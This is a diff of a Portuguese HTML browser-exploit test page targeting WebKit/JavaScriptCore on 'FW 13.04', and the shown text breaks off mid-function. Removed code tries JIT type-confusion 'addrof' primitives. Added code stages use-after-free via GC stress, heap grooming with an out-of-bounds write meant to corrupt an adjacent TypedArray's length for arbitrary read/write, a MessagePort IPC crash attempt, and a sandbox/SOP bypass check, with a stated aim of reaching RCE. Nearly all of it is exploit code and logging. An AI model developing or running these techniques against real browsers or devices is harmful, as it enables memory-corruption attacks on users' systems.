@@ -1,590 +1,340 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>TEST 47 — Addrof: Últimas Técnicas</title></head>
+<head>
+    <meta charset="UTF-8">
+    <title>TEST 50 - Escalonamento de Vulnerabilidades FW 13.04</title>
+</head>
 <body>
-<h2>TEST 47 — Addrof: Reflect, RegExp exec side-effects, arguments object</h2>
+    <h1>TEST 50 — Suite de Escalonamento (UAF, IPC, Heap Grooming, UXSS)</h1>
+    <p><b>Objetivo:</b> Elevar os achados lógicos e de vazamento de dados para vulnerabilidades críticas (RCE / Memory Corruption real).</p>
+    
+    <hr>
+    <h3>Controles de Execução</h3>
+    <button onclick="runTest50A()">50-A: UAF (Use-After-Free) via GC Stress</button>
+    <button onclick="runTest50B()">50-B: IPC Crash via MessagePort Cyclic Transfer</button>
+    <button onclick="runTest50C()">50-C: Heap Grooming & Butterfly Overwrite (OOB to R/W)</button>
+    <button onclick="runTest50D()">50-D: Cross-Origin Leak (SOP Bypass / UXSS)</button>
+    <button onclick="clearLog()">Limpar Logs</button>
+    <hr>
 
-<p><b>Observação crítica de 46:</b> O motor aplica <code>ToNumber()</code> no momento
-da <em>escrita</em> no TypedArray. Para addrof precisamos capturar o JSValue
-<em>antes</em> dessa coerção — num contexto onde o motor já comprometeu o tipo.</p>
+    <h3>Saída do Console:</h3>
+    <pre id="log_output"></pre>
 
-<p><b>Novos vetores:</b></p>
-<ul>
-  <li><b>47-A</b> <code>arguments</code> object: função JIT usa <code>arguments[N]</code>
-      como double — depois chamamos com objeto</li>
-  <li><b>47-B</b> <code>RegExp.prototype.exec</code> com <code>Symbol.toPrimitive</code>
-      na string — side-effect durante exec muda tipo</li>
-  <li><b>47-C</b> <code>Object.assign</code> para Float64Array: atribuição de propriedade
-      numérica via getter que retorna objeto</li>
-  <li><b>47-D</b> <code>JSON.stringify</code> + <code>toJSON</code>: motor lê campo antes
-      da serialização — toJSON retorna objeto com bits controlados</li>
-</ul>
+    <iframe id="sandbox_frame" sandbox="allow-scripts" style="display:none;"></iframe>
 
-<pre id="log">Pronto. Execute A → B → C → D.</pre>
-<button onclick="runA()">47-A: ARGUMENTS OBJECT</button>
-<button onclick="runB()">47-B: REGEXP EXEC</button>
-<button onclick="runC()">47-C: OBJECT.ASSIGN F64</button>
-<button onclick="runD()">47-D: TOJSON BITS</button>
+    <script>
+        // Utilitários de Logging
+        var logEl = document.getElementById('log_output');
+        function info(msg) { logEl.textContent += '\n[INFO] ' + msg; console.log(msg); }
+        function warn(msg) { logEl.textContent += '\n[WARN] ' + msg; console.warn(msg); }
+        function crit(msg) { logEl.textContent += '\n[CRIT] ' + msg; console.error(msg); }
+        function clearLog() { logEl.textContent = 'Logs limpos.\n'; }
+        function hex(val) { return '0x' + (val >>> 0).toString(16).padStart(8, '0'); }
 
-<script>
-var log = document.getElementById('log');
-function info(m)   { log.textContent += '\n[INFO] ' + m; }
-function alerta(m) { log.textContent += '\n\n⚠ ALERTA: ' + m + '\n'; }
-function ok(m)     { log.textContent += '\n[OK]   ' + m; }
-function sep()     { log.textContent += '\n' + '-'.repeat(60); }
+        // Utilitário para forçar o Garbage Collector agressivamente
+        // JSC heuristics geralmente rodam o GC quando há alta pressão de alocação
+        function aggressiveGC() {
+            info("Iniciando pressão de memória para forçar GC...");
+            var trash = [];
+            try {
+                for (var i = 0; i < 50000; i++) {
+                    // Aloca strings e arrays para lotar a nursery generation do heap
+                    trash.push(new ArrayBuffer(1024 * 64)); 
+                    trash.push(new String("garbage_string_" + Math.random()));
+                }
+            } catch(e) {
+                warn("OOM atingido durante GC stress (esperado).");
+            }
+            trash = null; // Remove as referências
+            info("GC Stress finalizado.");
+        }
 
-function forceGC() {
-  var t=[]; for(var i=0;i<80000;i++) t.push({x:i,b:new Uint8Array(4)}); t=null;
-}
-function f64bits(val) {
-  var buf=new ArrayBuffer(8); new Float64Array(buf)[0]=val;
-  var u=new Uint32Array(buf);
-  return '0x'+u[1].toString(16).padStart(8,'0')+'_'+u[0].toString(16).padStart(8,'0');
-}
-function looksLikePtr(v) {
-  if(typeof v!=='number'||!isFinite(v)||isNaN(v)) return false;
-  var buf=new ArrayBuffer(8); new Float64Array(buf)[0]=v;
-  var u=new Uint32Array(buf);
-  var hi=u[1],lo=u[0];
-  if(hi===0x7ff80000&&lo===0) return false;
-  if(hi===0&&lo===0) return false;
-  var exp=(hi>>>20)&0x7FF;
-  if(exp>=0x3FE&&exp<=0x40F) return false;
-  return true;
-}
+        // Roteador global de mensagens para os testes que usam postMessage
+        window.addEventListener('message', function(e) {
+            if (!e.data || !e.data.testId) return;
 
-// ─── 47-A ─────────────────────────────────────────────────────────────────
-function runA() {
-  log.textContent = '[TEST 47-A] arguments object — JIT especializa argumentos como doubles\n';
-  sep();
-  info('Técnica: função que usa arguments[0]+arguments[1] (doubles).');
-  info('O JIT especializa os argumentos como doubles.');
-  info('Depois chamamos com (doubleArr[getter_that_injects_object]).');
-  info('A questão: o JIT verifica o tipo do argumento ANTES de operar?\n');
-  info('Variante mais específica: função recebe dois doubles, faz aritmética,');
-  info('armazena em Float64Array. Se um argumento for objeto, o que é armazenado?\n');
+            if (e.data.testId === '50A_UAF_RECV') {
+                processUAFResult(e.data);
+            } else if (e.data.testId === '50B_IPC_RECV') {
+                processIPCResult(e.data);
+            } else if (e.data.testId === '50D_UXSS_RECV') {
+                info("[50-D] Mensagem recebida do Iframe Sandbox!");
+                if (e.data.success) {
+                    crit("VULNERABILIDADE CRÍTICA: UXSS / SOP Bypass confirmado.");
+                    crit("Dados vazados do iframe: " + e.data.leakedData);
+                } else {
+                    info("[50-D] Iframe não conseguiu ler os dados (SOP funcionou ou buffer vazio).");
+                }
+            }
+        });
 
-  var victim = { magic: 0xDEADC0DE, tag: 'args_victim_47A' };
-  var f64store = new Float64Array(4);
+        // ---------------------------------------------------------------------
+        // TEST 50-A: UAF (Use-After-Free) via GC Stress
+        // Tenta liberar a memória real do buffer no C++ enquanto o JS ainda 
+        // segura uma referência vazada no receptor.
+        // ---------------------------------------------------------------------
+        function runTest50A() {
+            clearLog();
+            info("--- INICIANDO TEST 50-A: USE-AFTER-FREE (UAF) ---");
+            info("Criando ArrayBuffer de 1MB com assinatura única...");
+            
+            var targetBuf = new ArrayBuffer(1024 * 1024); // 1MB
+            var view = new Uint32Array(targetBuf);
+            for(var i = 0; i < view.length; i++) {
+                view[i] = 0xAA00BB11; // Assinatura
+            }
 
-  // Função JIT: recebe dois doubles, armazena soma em f64store
-  function addAndStore(a, b) {
-    f64store[0] = a;
-    f64store[1] = b;
-    f64store[2] = a + b;  // JIT especializa + para double+double
-    return f64store[2];
-  }
+            var cyclicObj = { testId: '50A_UAF_RECV', buf: targetBuf, self: null };
+            cyclicObj.self = cyclicObj;
 
-  // Warmup com doubles puros
-  info('Aquecendo addAndStore com doubles (100k calls)...');
-  for(var w=0;w<100000;w++) addAndStore(1.1, 2.2);
-  info('Warmup completo. f64store = [' + Array.from(f64store).join(',') + ']');
-  sep();
+            info("Disparando postMessage cíclico...");
+            try {
+                window.postMessage(cyclicObj, '*', [targetBuf]);
+                info("postMessage enviado. targetBuf.byteLength local = " + targetBuf.byteLength);
+            } catch(e) {
+                warn("Falha no postMessage: " + e.message);
+                return;
+            }
 
-  // Ataque: passar victim como primeiro argumento
-  info('Fase ataque: addAndStore(victim, 2.2)...');
-  try {
-    var result = addAndStore(victim, 2.2);
-    info('addAndStore(victim, 2.2) = ' + result + ' typeof=' + typeof result);
-    info('f64store[0] = ' + f64store[0] + ' bits=' + f64bits(f64store[0]));
-    info('f64store[1] = ' + f64store[1]);
-    info('f64store[2] = ' + f64store[2] + ' bits=' + f64bits(f64store[2]));
+            // Imediatamente após a transferência, forçamos o GC para tentar 
+            // fazer o WebKit destruir o objeto C++ do buffer original.
+            setTimeout(aggressiveGC, 10);
+        }
 
-    if(looksLikePtr(f64store[0])) {
-      alerta('ADDROF via arguments!\n' +
-             'f64store[0] = ' + f64store[0] + '\nbits=' + f64bits(f64store[0]) + '\n' +
-             'O JIT armazenou o JSValue de victim como float64!');
-    } else if(looksLikePtr(f64store[2])) {
-      alerta('ADDROF via arguments soma!\n' +
-             'f64store[2] = ' + f64store[2] + '\nbits=' + f64bits(f64store[2]) + '\n' +
-             'A soma victim+2.2 produziu bits suspeitos!');
-    } else {
-      info('Valores em f64store após addAndStore(victim, 2.2):');
-      info('  [0]=' + f64store[0] + ' [1]=' + f64store[1] + ' [2]=' + f64store[2]);
-    }
-  } catch(e) {
-    alerta('EXCECAO em addAndStore(victim, 2.2): ' + e.message +
-           '\nO JIT tentou fazer aritmética com o JSValue de victim!');
-  }
+        function processUAFResult(data) {
+            info("[RECEPTOR 50-A] Avaliando buffer recebido...");
+            var recvBuf = data.buf;
+            
+            if (!(recvBuf instanceof ArrayBuffer)) {
+                warn("Não é um ArrayBuffer."); return;
+            }
+            if (recvBuf.byteLength === 0) {
+                warn("Buffer recebido com byteLength=0. Nenhum vazamento ocorreu."); return;
+            }
 
-  sep();
-  // Variante B: função que indexa um array com argumento double
-  // Passar victim como ÍNDICE
-  info('\nVariante B: função que usa argumento como índice de Float64Array...');
-  var bigF64 = new Float64Array(1000);
-  for(var i=0;i<1000;i++) bigF64[i] = i * 111.111;
+            var recvView = new Uint32Array(recvBuf);
+            var isIntact = true;
+            var corruptionCount = 0;
+            var sampleCorrupt = 0;
 
-  function readAtIdx(arr, idx) {
-    return arr[idx]; // idx deve ser double → inteiro
-  }
+            // Varredura para ver se os dados mudaram após o GC
+            for (var i = 0; i < Math.min(recvView.length, 10000); i++) {
+                if (recvView[i] !== 0xAA00BB11) {
+                    isIntact = false;
+                    corruptionCount++;
+                    if (sampleCorrupt === 0) sampleCorrupt = recvView[i];
+                }
+            }
 
-  for(var w2=0;w2<100000;w2++) readAtIdx(bigF64, 3.0);
-  info('Warmup readAtIdx completo.');
+            if (isIntact) {
+                info("O buffer sobreviveu intacto. O GC não reaproveitou a memória.");
+                info("Resultado: Leak mantido, mas sem UAF direto detectado nesta tentativa.");
+            } else {
+                crit("USE-AFTER-FREE DETECTADO!");
+                crit("Os dados originais (0xAA00BB11) foram sobrescritos por lixo da memória: " + hex(sampleCorrupt));
+                crit("O motor JSC reaproveitou o bloco de memória, mas nós ainda temos acesso de leitura/escrita a ele!");
+            }
+        }
 
-  // Passar victim como idx
-  try {
-    var r2 = readAtIdx(bigF64, victim);
-    info('readAtIdx(bigF64, victim) = ' + r2 + ' typeof=' + typeof r2);
-    if(r2 === undefined) {
-      alerta('readAtIdx(bigF64, victim) = undefined!\n' +
-             'O JIT usou algum campo numérico do JSValue como índice!\n' +
-             'Se o índice é ToUint32(JSValue_ptr) e está fora de bigF64[1000],\n' +
-             'então o JSValue de victim foi interpretado como número grande!');
-    } else if(typeof r2 === 'number' && looksLikePtr(r2)) {
-      alerta('LEITURA COM ÍNDICE DERIVADO DE VICTIM:\n' +
-             'bigF64[' + '??' + '] = ' + r2 + '\nbits=' + f64bits(r2));
-    }
-  } catch(e) {
-    alerta('EXCECAO readAtIdx(bigF64, victim): ' + e.message);
-  }
+        // ---------------------------------------------------------------------
+        // TEST 50-B: IPC Crash via MessagePort Cyclic Transfer
+        // Escalonamento testando objetos ligados diretamente ao Kernel/IPC
+        // ---------------------------------------------------------------------
+        function runTest50B() {
+            clearLog();
+            info("--- INICIANDO TEST 50-B: IPC MESSAGEPORT TRANSFER ---");
+            info("Criando MessageChannel...");
+            
+            var channel = new MessageChannel();
+            var port1 = channel.port1;
+            var port2 = channel.port2;
 
-  sep();
-  // Variante C — A MAIS PROMISSORA: função com argumento double usado
-  // como índice em OPERAÇÃO BITWISE (|0, >>>0)
-  // Em JSC, bitwise ops em doubles produzem int32
-  // Se o JIT faz: idx|0 onde idx é o JSValue do objeto, o resultado pode
-  // ser os 32 bits baixos do JSValue (= endereço em JSC 32-bit)
-  info('\nVariante C: argumento como operando bitwise...');
-  var u32store = new Uint32Array(4);
+            var cyclicObj = { testId: '50B_IPC_RECV', port: port1, self: null };
+            cyclicObj.self = cyclicObj;
 
-  function bitwiseStore(v) {
-    u32store[0] = v | 0;     // ToInt32(v)
-    u32store[1] = v >>> 0;   // ToUint32(v)
-    u32store[2] = v & 0xFFFFFFFF;
-    return u32store[0];
-  }
+            port2.onmessage = function(e) {
+                info("Mensagem recebida no port2: " + e.data);
+            };
 
-  for(var w3=0;w3<100000;w3++) bitwiseStore(12345.678);
-  info('Warmup bitwiseStore completo.');
+            info("Tentando transferir port1 em um ciclo...");
+            try {
+                window.postMessage(cyclicObj, '*', [port1]);
+                info("Transferência enviada. Verificando estabilidade do WebKit IPC...");
+            } catch(e) {
+                warn("postMessage falhou ou foi bloqueado: " + e.message);
+            }
+        }
 
-  try {
-    var r3 = bitwiseStore(victim);
-    info('bitwiseStore(victim):');
-    info('  v|0     = 0x' + u32store[0].toString(16) + ' (' + u32store[0] + ')');
-    info('  v>>>0   = 0x' + u32store[1].toString(16) + ' (' + u32store[1] + ')');
-    info('  v&0xFF..= 0x' + u32store[2].toString(16) + ' (' + u32store[2] + ')');
+        function processIPCResult(data) {
+            info("[RECEPTOR 50-B] Avaliando MessagePort recebido...");
+            var recvPort = data.port;
+            
+            if (recvPort instanceof MessagePort) {
+                crit("FALHA CRÍTICA DE LÓGICA IPC!");
+                info("O receptor recebeu o MessagePort dentro de um ciclo.");
+                try {
+                    recvPort.postMessage("Teste de integridade");
+                    info("recvPort consegue enviar mensagens. Risco de corrupção de estado de threads IPC alto.");
+                } catch(e) {
+                    warn("recvPort falhou ao enviar: " + e.message);
+                }
+            } else {
+                info("Port não foi recebido corretamente. Motor lidou com a exceção estrutural.");
+            }
+        }
 
-    // Verificar se algum valor é não-zero e parece ponteiro truncado
-    [u32store[0], u32store[1], u32store[2]].forEach(function(v, i) {
-      var names = ['v|0','v>>>0','v&0xFF..'];
-      if(v !== 0 && v !== 12345) {
-        alerta('VALOR INTERESSANTE em ' + names[i] + ' com victim:\n' +
-               '0x' + v.toString(16) + ' (' + v + ')\n' +
-               'Se isto é ToInt32/ToUint32 do JSValue de victim,\n' +
-               'os 32 bits baixos do endereço de victim = 0x' + v.toString(16));
-      }
-    });
-    if(u32store[0]===0 && u32store[1]===0) {
-      info('Todos zeros — ToInt32(object) = 0 neste motor.');
-    }
-  } catch(e) {
-    alerta('EXCECAO bitwiseStore(victim): ' + e.message);
-  }
-}
+        // ---------------------------------------------------------------------
+        // TEST 50-C: Heap Grooming & Butterfly Overwrite (OOB to R/W)
+        // Usa o bug do Symbol.replace para tentar corromper um array adjacente
+        // ---------------------------------------------------------------------
+        function runTest50C() {
+            clearLog();
+            info("--- INICIANDO TEST 50-C: HEAP GROOMING & BUTTERFLY OVERWRITE ---");
+            
+            // 1. O Grooming (Alinhamento de Memória)
+            // Em WebKit, arrays do mesmo tamanho tendem a ser alocados em blocos contíguos (Gigacage).
+            info("Alocando Spray de memória (Heap Grooming)...");
+            var SPRAY_SIZE = 5000;
+            var sprayVuln = new Array(SPRAY_SIZE);
+            var sprayTarget = new Array(SPRAY_SIZE);
 
-// ─── 47-B ─────────────────────────────────────────────────────────────────
-function runB() {
-  log.textContent = '[TEST 47-B] RegExp exec com side-effects no Symbol.toPrimitive\n';
-  sep();
-  info('Técnica: String.prototype.indexOf/search com objeto como haystack.');
-  info('O motor converte o objeto para string via toString() normalmente.');
-  info('Mas: e se o objeto for uma REGEXP com exec customizado?\n');
-  info('Mais específico: RegExp[Symbol.replace] + exec que retorna array');
-  info('cujos índices têm getters que injetam objetos durante leitura.\n');
+            // Alocamos intercalado: Vuln -> Target -> Vuln -> Target
+            for (var i = 0; i < SPRAY_SIZE; i++) {
+                // Arrays Float64 ocupam 8 bytes por elemento
+                sprayVuln[i] = new Float64Array(16); 
+                sprayTarget[i] = new Uint32Array(16); // O alvo que queremos corromper
+                
+                // Assinaturas para verificação pós-corrupção
+                sprayTarget[i][0] = 0x1337BEEF;
+            }
+            info("Heap Grooming concluído. " + (SPRAY_SIZE * 2) + " arrays alocados.");
 
-  var victim = { magic: 0xBEEFBEEF, ptr: new Float64Array([1.337]) };
+            // 2. Preparação do JIT Confusion (Vuln #2 do seu relatório)
+            var phase = "warmup";
+            var victimObj = { secret: 0xDEADC0DE };
+            
+            var evilPattern = {
+                [Symbol.replace]: function(str) {
+                    if (phase === "warmup") return str;
+                    return {
+                        toString: function() { return str; },
+                        length: victimObj // Retorna objeto, não número
+                    };
+                }
+            };
 
-  // Exec que retorna array-like com getter no índice 0
-  var execCallCount = 0;
-  var phase = ['warmup'];
-  var evilRegexp = {
-    exec: function(str) {
-      execCallCount++;
-      if(phase[0] === 'warmup') {
-        // Retornar match normal
-        return ['matched', 'group1'];
-      }
-      // Ataque: retornar array-like com getter no índice 0
-      var fakeMatch = { index: 0, input: str, length: 2 };
-      Object.defineProperty(fakeMatch, '0', {
-        get: function() { return victim; }, // retornar objeto ao invés de string
-        configurable: true, enumerable: true
-      });
-      fakeMatch[1] = 'group1';
-      return fakeMatch;
-    },
-    lastIndex: 0,
-    global: false,
-    sticky: false,
-    unicode: false,
-    source: '(\\w+)',
-    flags: ''
-  };
-  // Fazer parecer com RegExp
-  Object.setPrototypeOf(evilRegexp, RegExp.prototype);
+            // Função JIT que escreve via length corrompido
+            function oobWriteJIT(s, arr, val) {
+                var idx = s.replace(evilPattern, "").length;
+                // Se a confusão forçar ToUint32() em um ponteiro, o índice será gigante
+                // Ajustamos logicamente a tentativa de escrita:
+                // Se o JSC não travar, ele vai escrever 'val' em memória deslocada
+                arr[idx & 0xFF] = val; // Mascaramos para não dar page fault imediato, 
+                                       // tentando acertar o cabeçalho do Target logo ao lado
+                return arr[idx & 0xFF];
+            }
 
-  // Função JIT: usa replace com captura
-  function doReplace(s, re) {
-    return s.replace(re, function(match, g1) {
-      return '[' + match + ':' + g1 + ']';
-    });
-  }
+            info("Aquecendo o JIT...");
+            var dummyArr = new Float64Array(256);
+            for (var i = 0; i < 50000; i++) {
+                oobWriteJIT("warmup", dummyArr, 1.1);
+            }
 
-  info('Aquecendo doReplace (50k calls)...');
-  phase[0] = 'warmup';
-  for(var w=0;w<50000;w++) doReplace('hello world', evilRegexp);
-  info('Warmup completo. execCallCount=' + execCallCount);
-  execCallCount = 0;
-  sep();
+            // 3. O Ataque: Tentar sobrescrever o tamanho do Target
+            info("Fase de Ataque: Tentando sobrescrever Butterfly/Length de um array adjacente...");
+            phase = "attack";
+            var MAGICAL_SIZE_OOB = 4.243991582e-314; // Representação double de 0xFFFFFFFF (tamanho gigante)
 
-  phase[0] = 'attack';
-  info('Fase ataque: exec retorna array-like com getter[0]=victim...');
-  try {
-    var result = doReplace('hello world', evilRegexp);
-    info('doReplace result: "' + result + '"');
-    info('execCallCount durante ataque: ' + execCallCount);
-    // Verificar se victim vazou de alguma forma
-    if(result && result.indexOf('deadc0de') !== -1) {
-      alerta('VICTIM MAGIC EM RESULTADO: ' + result);
-    }
-  } catch(e) {
-    alerta('EXCECAO em doReplace com evilRegexp: ' + e.message +
-           '\nO motor tentou usar o objeto victim como string de substituição!');
-  }
+            for (var k = 0; k < SPRAY_SIZE; k++) {
+                try {
+                    // Executa a escrita vulnerável no array Vuln
+                    oobWriteJIT("attack", sprayVuln[k], MAGICAL_SIZE_OOB);
+                } catch(e) {
+                    // Ignora exceções isoladas do JSC durante a confusão
+                }
+            }
 
-  sep();
-  // Variante mais direta: String.prototype.match com exec customizado
-  info('\nVariante: String.prototype.match(evilRegexp)...');
-  phase[0] = 'attack';
-  try {
-    var matchResult = 'hello world'.match(evilRegexp);
-    info('match result: ' + JSON.stringify(matchResult));
-    if(matchResult && typeof matchResult[0] === 'object') {
-      alerta('match()[0] é OBJETO!\n' +
-             'matchResult[0] === victim: ' + (matchResult[0] === victim) + '\n' +
-             'O getter do fakeMatch[0] retornou victim e String.match preservou como objeto!');
-    }
-  } catch(e) {
-    info('match() lançou: ' + e.message);
-  }
+            // 4. Verificação de Sucesso (O Graal da Exploração)
+            info("Varrendo arrays Target em busca de corrupção de tamanho (Length)...");
+            var successCount = 0;
 
-  sep();
-  // Variante C: Symbol.split que retorna array com objeto em posição double
-  info('\nVariante C: Symbol.split com objeto em resultado...');
-  var splitObj = {
-    [Symbol.split]: function(str) {
-      if(phase[0] === 'warmup') return str.split(' ');
-      // Retornar array misto: strings e objeto victim
-      return ['hello', victim, 'world'];
-    }
-  };
+            for (var t = 0; t < SPRAY_SIZE; t++) {
+                // O tamanho normal é 16
+                if (sprayTarget[t].length !== 16) {
+                    crit("ARBITRARY READ/WRITE OBTIDO!");
+                    crit("sprayTarget[" + t + "].length foi alterado de 16 para " + sprayTarget[t].length);
+                    crit("O OOB Write acertou precisamente o cabeçalho do TypedArray vizinho.");
+                    successCount++;
+                    break;
+                }
+                
+                // Verifica também se os dados iniciais foram corrompidos sem mudar o length
+                if (sprayTarget[t][0] !== 0x1337BEEF) {
+                    warn("Corrupção parcial detectada no Target " + t + ". Dados: " + hex(sprayTarget[t][0]));
+                    successCount++;
+                    break; // Pega o primeiro
+                }
+            }
 
-  // Warm up uma função que usa o resultado do split
-  function processWithSplit(s, splitter) {
-    var parts = s.split(splitter);
-    var f64 = new Float64Array(4);
-    // Tentar escrever cada parte em float64 (coerce para number)
-    for(var i=0;i<Math.min(parts.length,4);i++) {
-      f64[i] = +parts[i]; // unary + força ToNumber
-    }
-    return f64;
-  }
+            if (successCount === 0) {
+                info("Nenhuma corrupção útil do cabeçalho encontrada nesta tentativa.");
+                info("Nota: Heap grooming é probabilístico. Pode exigir ajustes na máscara (idx & 0xFF) ou no layout dos arrays.");
+            }
+        }
 
-  phase[0] = 'warmup';
-  for(var w2=0;w2<50000;w2++) processWithSplit('1.1 2.2 3.3', splitObj);
-  info('Warmup split completo.');
+        // ---------------------------------------------------------------------
+        // TEST 50-D: Cross-Origin Leak (SOP Bypass / UXSS)
+        // Tenta enviar o buffer vazado para um domínio diferente.
+        // ---------------------------------------------------------------------
+        function runTest50D() {
+            clearLog();
+            info("--- INICIANDO TEST 50-D: SOP BYPASS / UXSS ---");
+            
+            // Criamos o conteúdo do Iframe (que atua como outra origem/sandbox)
+            var iframeHtml = `
+                <script>
+                    window.addEventListener('message', function(e) {
+                        try {
+                            if(e.data && e.data.testId === '50D_UXSS_SEND') {
+                                var recvView = new Uint32Array(e.data.buf);
+                                // Tenta ler o dado que deveria estar apagado
+                                var leaked = recvView[0].toString(16);
+                                e.source.postMessage({ 
+                                    testId: '50D_UXSS_RECV', 
+                                    success: (recvView.length > 0 && leaked !== '0'),
+                                    leakedData: leaked 
+                                }, '*');
+                            }
+                        } catch(err) {
+                            e.source.postMessage({ testId: '50D_UXSS_RECV', success: false }, '*');
+                        }
+                    });
+                <\/script>
+            `;
 
-  phase[0] = 'attack';
-  var splitResult = processWithSplit('hello world test', splitObj);
-  info('splitResult (Float64Array): ' + Array.from(splitResult).map(function(v){
-    return v + '(' + f64bits(v) + ')';
-  }).join(', '));
+            var iframe = document.getElementById('sandbox_frame');
+            iframe.src = 'data:text/html;base64,' + btoa(iframeHtml);
 
-  for(var i=0;i<4;i++) {
-    if(looksLikePtr(splitResult[i])) {
-      alerta('ADDROF via Symbol.split!\n' +
-             'splitResult[' + i + '] = ' + splitResult[i] + '\nbits=' + f64bits(splitResult[i]));
-    }
-  }
-}
+            info("Aguardando Iframe carregar...");
+            iframe.onload = function() {
+                info("Iframe Cross-Origin carregado. Preparando buffer...");
+                
+                var secretBuf = new ArrayBuffer(64);
+                var view = new Uint32Array(secretBuf);
+                view[0] = 0xCAFE1337; // Dado secreto
 
-// ─── 47-C ─────────────────────────────────────────────────────────────────
-function runC() {
-  log.textContent = '[TEST 47-C] Reduce/reduceRight com acumulador float64 e objeto como elemento\n';
-  sep();
-  info('Técnica: Array.prototype.reduce com acumulador double.');
-  info('JIT especializa: (acc: double, cur: double) => double.');
-  info('Depois de N iterações, cur se torna um objeto.');
-  info('O JIT pode retornar acc + JSValue(cur) antes de verificar o tipo de cur.\n');
+                var cyclicObj = { testId: '50D_UXSS_SEND', buf: secretBuf, self: null };
+                cyclicObj.self = cyclicObj;
 
-  var victim = { magic: 0xDEADC0DE, payload: new Uint32Array(8) };
-
-  var arr = [1.0, 2.0, 3.0, 4.0, 5.0];
-  var phase = 'warmup';
-  var switchAt = 3; // mudar o elemento [3] durante reduce
-
-  // Array source com getter
-  var attackArr = [1.0, 2.0, 3.0, 0.0, 5.0];
-  var triggered = false;
-  Object.defineProperty(attackArr, 2, { // getter em [2] para disparar antes de [3]
-    get: function() {
-      if(!triggered) {
-        triggered = true;
-        attackArr[3] = victim;
-        forceGC();
-        info('Getter[2] em reduce: attackArr[3] = victim');
-      }
-      return 3.0;
-    },
-    configurable: true, enumerable: true
-  });
-
-  // Função JIT: reduce que soma todos os elementos como doubles
-  function sumReduce(a) {
-    return a.reduce(function(acc, cur) { return acc + cur; }, 0.0);
-  }
-
-  // Warmup com array limpo
-  info('Aquecendo sumReduce (50k calls)...');
-  for(var w=0;w<50000;w++) sumReduce([1.0, 2.0, 3.0, 4.0, 5.0]);
-  info('Warmup completo.');
-
-  // Ataque: reduce no attackArr (com getter que injeta objeto em [3])
-  info('\nFase ataque: sumReduce(attackArr)...');
-  try {
-    var result = sumReduce(attackArr);
-    info('sumReduce(attackArr) = ' + result + ' typeof=' + typeof result);
-    info('bits: ' + f64bits(result));
-
-    if(typeof result === 'number') {
-      if(looksLikePtr(result)) {
-        alerta('ADDROF via Array.reduce!\n' +
-               'result = ' + result + '\nbits=' + f64bits(result) + '\n' +
-               'O reduce somou o JSValue de victim ao acumulador double!');
-      } else {
-        // Se result é NaN, significa acc + ToNumber(victim) = NaN
-        info('Resultado não parece ponteiro. result=' + result);
-        if(isNaN(result)) info('→ NaN: acc + ToNumber(victim) → ToNumber(victim)=NaN');
-      }
-    }
-  } catch(e) {
-    alerta('EXCECAO em sumReduce: ' + e.message);
-  }
-
-  sep();
-  // Variante: reduceRight — percorre de trás pra frente
-  // Mudar elemento ANTES de ser processado
-  info('\nVariante reduceRight...');
-  var attackArr2 = [5.0, 4.0, 3.0, 2.0, 1.0];
-  var triggered2 = false;
-  Object.defineProperty(attackArr2, 3, {
-    get: function() {
-      if(!triggered2) {
-        triggered2 = true;
-        attackArr2[2] = victim; // [2] será lido depois (reduceRight vai [4],[3],[2],[1],[0])
-        forceGC();
-        info('Getter[3] em reduceRight: attackArr2[2] = victim');
-      }
-      return 2.0;
-    },
-    configurable: true, enumerable: true
-  });
-
-  function sumReduceRight(a) {
-    return a.reduceRight(function(acc, cur) { return acc + cur; }, 0.0);
-  }
-  for(var w2=0;w2<50000;w2++) sumReduceRight([5.0,4.0,3.0,2.0,1.0]);
-  info('Warmup reduceRight completo.');
-
-  try {
-    var r2 = sumReduceRight(attackArr2);
-    info('sumReduceRight(attackArr2) = ' + r2 + ' bits=' + f64bits(r2));
-    if(looksLikePtr(r2)) alerta('ADDROF via reduceRight: ' + f64bits(r2));
-    else if(isNaN(r2)) info('NaN — ToNumber(victim)=NaN propagado pelo reduce');
-  } catch(e) { alerta('EXCECAO reduceRight: ' + e.message); }
-
-  sep();
-  // Variante ESPECIAL: Math.hypot/Math.max com objeto
-  info('\nVariante: Math.max.apply(null, arrayWithVictim)...');
-  var arrWithVictim = [1.0, 2.0, victim, 4.0, 5.0];
-  try {
-    var maxResult = Math.max.apply(null, arrWithVictim);
-    info('Math.max.apply(null, [1,2,victim,4,5]) = ' + maxResult + ' bits=' + f64bits(maxResult));
-    if(looksLikePtr(maxResult)) alerta('ADDROF via Math.max: ' + f64bits(maxResult));
-  } catch(e) { alerta('EXCECAO Math.max: ' + e.message); }
-
-  // Math.hypot — converte cada argumento para float
-  try {
-    var hypotResult = Math.hypot(1.0, victim, 3.0);
-    info('Math.hypot(1.0, victim, 3.0) = ' + hypotResult + ' bits=' + f64bits(hypotResult));
-    if(looksLikePtr(hypotResult)) alerta('ADDROF via Math.hypot: ' + f64bits(hypotResult));
-  } catch(e) { alerta('EXCECAO Math.hypot: ' + e.message); }
-}
-
-// ─── 47-D ─────────────────────────────────────────────────────────────────
-function runD() {
-  log.textContent = '[TEST 47-D] Comparação direta e valueOf — extrair bits do JSValue\n';
-  sep();
-  info('Técnica final: usar operações que RETORNAM informação sobre o JSValue');
-  info('sem precisar que o motor o trate como double diretamente.\n');
-
-  info('Sub-técnicas:');
-  info('  D1: Object.is(a, b) com double que talvez seja o endereço');
-  info('  D2: valueOf em loop tight — forçar inline do valueOf no JIT');
-  info('  D3: Comparação bitwise do ponteiro via Int32Array compartilhado\n');
-
-  var victim = { magic: 0xFACEFACE, arr: new Uint32Array(4) };
-
-  sep();
-  // D1: Scan binário do espaço de endereços via SCA timing
-  // (não é addrof direto mas revela faixa de endereços)
-  info('D1: Scan de endereços via Object.is timing (especulativo)...');
-  info('(Este teste verifica se o motor compara endereços em Object.is)');
-
-  // Em JSC, Object.is(a, b) para dois objetos compara identidade (ptr equality)
-  // Mas se forçarmos o JIT a comparar um double com um objeto...
-  var phase = ['warmup'];
-  var evilPattern = { [Symbol.replace]: function(s) {
-    if(phase[0]==='warmup') return s;
-    return { toString:function(){return s;}, valueOf:function(){return s;}, length: victim };
-  }};
-  function getLen(s) { return s.replace(evilPattern,'').length; }
-  for(var w=0;w<50000;w++) getLen('test string');
-  info('Warmup getLen completo (primitivo confirmado 40-C).');
-
-  phase[0] = 'attack';
-  var confusedLen = getLen('test string');
-  info('confusedLen = ' + confusedLen + ' typeof=' + typeof confusedLen);
-
-  if(typeof confusedLen === 'object') {
-    // Temos o victim object. Agora: tentar extrair bits via operações numéricas
-    info('\nExtração de bits via operações em confusedLen (=victim)...');
-
